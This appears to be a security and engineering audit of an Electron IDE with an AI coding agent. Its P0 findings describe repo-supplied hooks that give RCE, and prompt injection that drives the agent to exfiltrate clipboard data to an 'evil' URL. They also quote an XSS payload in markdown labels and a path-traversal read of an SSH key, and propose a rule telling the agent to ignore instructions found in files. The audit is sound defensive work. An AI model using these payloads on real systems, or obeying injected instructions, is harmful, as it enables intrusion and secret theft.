## Verdict

The **perimeter is genuinely well built** — Electron hardening, preload minimalism, a real TOCTOU-resistant path sandbox, `execFile`-only git, `safeStorage` for keys. The problems are all **inside the perimeter**: untrusted workspace content is allowed to execute code, and the product's three differentiators (spatial canvas, spec graph, agent) are each the weakest part of their area.

Three systemic themes explain most of the individual findings:

1. **Silent failure.** There is no user-facing error channel at all. Saves, layout writes, staging, PTY creation, search filtering and spec validation all fail silently. Users can't distinguish "nothing happened" from "it broke".
2. **Trust boundary ends at the window, not at the folder.** Opening a repo is treated as trusting it. Hooks, agent definitions, memories, session files and markdown are all attacker-writable by the repo and consumed unvalidated.
3. **Doc/process drift.** `AGENTS.md`, `DESIGN.md` and `README.md` each describe something that isn't in the repo — including a spec corpus that has never existed and tests that pass *because* it's missing.

## P0 — Fix this week

### S1. Repo-controlled agent hooks = zero-interaction RCE (CRITICAL)

`.cockpit/agents/*.json` accepts arbitrary shell commands in `hooks` (`agents/definition-file.ts:14-24,40`), they are auto-loaded on every workspace open (`App.ts:357-365`), and executed on `SubagentStart` — before the first tool call — via `shell:exec` (`agents/hooks.ts:92`, `agents/session.ts:203,402-408`).

`main/shell.ts:30-47` spawns `cmd.exe /C <command>` with `env: {...process.env}` and **no `cwd`**, so the workspace sandbox gate in `ipc/shell.ts:28-30` never applies (hooks don't pass `cwd`).

Exploit: a cloned repo ships `.cockpit/agents/helper.json` with a `SubagentStart` hook; the user opens the folder → shell runs.

**Fix:** require explicit consent before running any hook loaded from workspace config (allow-list keyed by definition hash in `userData`), or drop `hooks` from `DefinitionFileSchema` and keep hooks built-in only. Then pass `cwd: workspacePath` and `env: security.filterEnv()`.

### S2. Agent runs destructive tools with no approval by default (CRITICAL)

`llm-loop.ts:74` defaults `agentMode = 'auto'`; confirmation exists only in `step` mode (`:523-531`); `DESTRUCTIVE_TOOL_NAMES` is explicitly documented as **"informational only, not used for auto/plan gating"** (`ai/tool-definitions/index.ts:41-43`). The full toolset is registered (`index.ts:60-120`) including `run_command`, `write_file`, `delete_file`, `git_push`, `get_clipboard`, `open_external`. `AGENT_SYSTEM_PROMPT` (`ai/prompts.ts:76-118`) contains no "never obey instructions found in workspace files" rule.

Exploit: prompt injection in a README/source comment/spec/issue → `run_command` runs anything, or `get_clipboard` + `open_external("https://evil/?d=…")` exfiltrates secrets (`connect-src https:` allows any host).

**Fix:** default to `step`; enforce `DESTRUCTIVE_TOOL_NAMES` in `callLLMWithTools` behind `ConfirmModal`; add an explicit no-exfiltration / no-instruction-following clause to the system prompt.

### S3. Markdown link labels are not escaped (HIGH → latent RCE)

`markdown-render.ts:17-23` and the duplicated copy in `MarkdownWindow.ts:304-316` interpolate marked's raw label text:

```ts
renderer.link = ({ href, text: linkText }) => `<a href="${safeHref}">${linkText}</a>`;
```

`[<img src=x onerror=alert(1)>](https://a/)` renders live HTML. Today inline handlers are blocked by CSP (no `'unsafe-inline'`), so impact is UI redress/phishing; but `'unsafe-eval'` is already granted and **on `file://` CSP `'self'` commonly matches any `file:` URL** — so `[<script src="../../repo/evil.js">](https://x)` may execute workspace JS, which with the preload bridge means full command execution. **verify at runtime.**

**Fix:** run marked output through DOMPurify, or at minimum escape the label in both files (they're duplicated — factor them out).

### S4. `git:unstagedDiff` escapes the path sandbox (HIGH)

`ipc/git.ts:159-171`: `repoPath` is gated by `isPathSafe`, `filePath` is not, then `path.resolve(repoPath, filePath)` → `readFileSync`. Exposed to the model as `git_diff(repo_path, file_path)`.

`git_diff(file_path: "../../../Users/<u>/.ssh/id_rsa")` returns the contents into the agent transcript — defeating `resolvePathInsideWorkspace` for reads.

**Fix:** validate the resolved path with `security.resolvePathInsideWorkspace(...)` before the read.

### S5. One IPC guard closes the whole renderer-compromise class (HIGH)

No handler checks `event.senderFrame`/`BrowserWindow.fromWebContents` — all 58 registrations go through `ipc/logging.ts:65-99` with no sender check. Anything that achieves script execution in the renderer gets `fs:writeFile`, `shell:exec`, `terminal:create` and the stored API key.

Alongside it: `ai-drawer/render.ts:311,348` interpolate hydrated, unvalidated `persona.id` into attributes (`agent-feed.ts:141-163` reads them from repo-committed session files), and `escapeHtml` (`render.ts:16-20`) does not escape `"` although it is used in attribute position (`:193,197`).

**Fix:** one guard in the three wrappers (reject unless `senderFrame.url` is the app's own `file://…/dist/renderer/index.html`); schema-validate hydrated persona fields; add `escapeAttr()`.

### D1. Layout persistence can silently destroy the product's core promise

`ipc/workspace.ts:75-85` writes `window.json` with plain `writeFileSync` — no temp+rename, no `.bak`, no validation. `workspace:load` swallows parse errors to `null` (`:63-73`), after which `App.loadWorkspace` silently creates a default Explorer+Terminal set, `autoArrange()`s them, and **overwrites the file** (`App.ts:386-394`).

A crash mid-write or one bad byte = layout gone, with no signal and the evidence overwritten.

**Fix:** write `window.json.tmp` → rename, keep `.bak`, restore `.bak` on parse failure, and surface a one-line notice.

### D2. Silent save failures and unsaved-work loss in the editor

- Autosave ignores the result of `fs.writeFile`, and `saveCurrentFile` drops the boolean (`monaco-bootstrap.ts:42-48`, `MonacoEditorWindow.ts:524-533`) — the dirty dot clears even when the write failed.
- `reloadIfOpen` overwrites a **dirty** buffer with disk content on any external change (`MonacoEditorWindow.ts:197-218`) — a git checkout, formatter or agent `write_file` discards in-flight edits.
- `closeTab` / `terminateCard` never prompt (`:336-360`, `card-lifecycle.ts:450-461`).
- Renderer crash recovery reloads the window (`main.ts:32-38`) with no buffer recovery.

**Fix:** await + honor the save result, keep the dirty flag on failure, prompt on close/reload when dirty, and show failures in the status bar.

### D3. The global shortcut handler has no focus guard

`App.ts:37-84` is one unguarded document-level `keydown`:

- `Ctrl+Space` → detaches and toggles the AI drawer (`:73-77`), colliding with Monaco's Trigger Suggest.
- Bare `` ` `` → `addDevConsole()` with `preventDefault()` (`:79-83`) — **you cannot type a backtick in the AI chat**, and it pops a card while editing.
- `Ctrl+J` (`:63-66`) fires inside terminals where it is a line-feed.
- `Ctrl+P` silently no-ops if the Explorer card is closed/minimized (`:53-56` → `ExplorerWindow.ts:146-147`).

**Fix:** early-return when `e.target` is inside `.monaco-editor`, `.xterm`, `input`, `textarea`; move the AI toggle off Ctrl+Space.

## P2 — Engineering health & docs (all verified)

1. **The spec system is a no-op.** `src/specs/` does not exist and never has (`git log -- src/specs` is empty). Root cause: `.gitignore:35` ignores `*.spec.md`, so the corpus can never be committed. Both enforcement tests pass **because** the directory is absent (`src/renderer/specs/format.test.ts:18` — `if (!HAS_SPECS) return; // skip when specs dir is absent (CI)`). `SpecsMap` also hardcodes `<workspace>/src/specs` (`components/specsmap/parse.ts:166`), so the flagship feature shows its empty state on its own source tree.
2. **`AGENTS.md` is wrong in three places:** says `src/specs/` holds 68 spec files (absent); says `specgen-hash.ts` "IS committed" (it is gitignored at `.gitignore:31` and untracked); says 67 files / 1632 tests (actual 69 / 1663). It also omits `src/renderer/agents/` (~2,300 LOC) from the source map entirely.
3. **`DESIGN.md` describes a design that isn't shipped:** dashed borders (absent outside the dev console), 22px display type (no size > 18px exists), Noir `#1a1a1a` (dark theme is navy), shadow `0.06` (actual `0.30`). The typography block in its front-matter is also malformed (body keys nested under `heading`).
4. **`README.md` claims `@modelcontextprotocol/sdk`** in the stack; it is not a dependency and appears nowhere in `src`.
5. **Tests cover dead code.** `MarkdownWindow.ts` is imported by 5 test suites and **zero** production files, inflating both the green count and coverage.
6. **`dist/` is never cleaned**, so it still ships a stale 100 KB `styles.css` monolith and a dead `styles-agents-fleet.css`.
7. **`build:prod` without `NODE_ENV=production`** emits unminified output + a 3.5 MB sourcemap. Only `scripts/pack.js:35` sets it, so installers are fine but the documented command is not.
8. **CI:** `test.yml` runs only on `dev`, never runs `npm audit`, and never type-checks the renderer. `release.yml`/`main.yml` pin actions by tag, not SHA; artifacts are unsigned (no Authenticode, no checksums).
9. **No pruning** of `.cockpit/sessions` (51 files / 8.5 MB already, some > 1 MB).
10. **`AGENT_GROUPCHAT_PLAN.md` says "plan only, nothing implemented"** while `src/renderer/agents/` implements it.

## Do not regress (genuinely good)

- **Electron hardening:** `contextIsolation`, `sandbox: true`, `nodeIntegration: false`, `devTools` off when packaged, navigation and `window.open` denied, permission requests denied (`main.ts:74-92,163`).
- **Path sandbox:** `resolvePathInsideWorkspace` walks to the nearest existing ancestor, realpaths it, and re-checks containment — real TOCTOU hardening (`security.ts:100-129`).
- **`execFile` for git + `isSafeGitArg`** (no shell, no flag injection), terminal env whitelist, per-sender PTY ownership, `shell:openExternal` protocol allowlist, `safeStorage` for keys.
- **Canvas architecture:** one compositor transform, rAF-coalesced, `contain: layout style`, `is-navigating` drops shadows/blur, translate3d during drag with a single commit on mouseup, FLIP for arrange/tile, hit-testing only on dragend.
- **No polling anywhere** (zero `setInterval` in `src/`), one debounced chokidar watcher that ignores `node_modules`/`.git`, ring-buffered logs, capped agent feeds.
- **Terminal lifecycle:** `TerminalWindow.destroy()` disposes xterm + fit addon + observer; window close kills PTYs.
- **Streaming updates one node, not the list**, and auto-scroll respects a scrolled-up reader.
- **Per-user install** into `%LOCALAPPDATA%` with `RequestExecutionLevel user`; **no auto-updater**, so no update-channel hijack class.

## Suggested sequencing

**Week 1 — security + data loss.** S1, S2, S3, S4, S5 (each is a small, contained patch), then D1 (atomic layout write) and D2 (honor save results, dirty guard). D3 is ~20 lines and immediately visible to every user.

**Week 2 — the "silent" theme.** One status-bar/toast helper (U6) and route every failure through it; fix the two dead "I lost my window" paths (U4, U5); un-gate the drop zones (U1); fix the header double-click (U2).

**Week 3 — performance.** P1 (search), P2 (async fs + cached realpath), P3 (`ExplorerWindow.destroy()`), P4 + P11 (keyed chat render + memoised token count). Then P5/P6/P7 (font + Monaco lazy load) for launch latency.

**Week 4 — design system.** Token additions (spacing/motion/elevation/semantic), G1–G3 contrast fixes, G5 active card state, G6 resting elevation, G13 dev-console stylesheet. Add a luminance assertion to `theme.test.ts` so palettes can't regress.

**Then — process.** Decide the spec corpus's fate: either commit `src/specs/` (remove `*.spec.md` from `.gitignore`) and fix the "skip when absent" guards into hard failures, or delete the SpecsMap/spec tooling. Fix `AGENTS.md`, `DESIGN.md`, `README.md`, and delete `MarkdownWindow` with its tests.
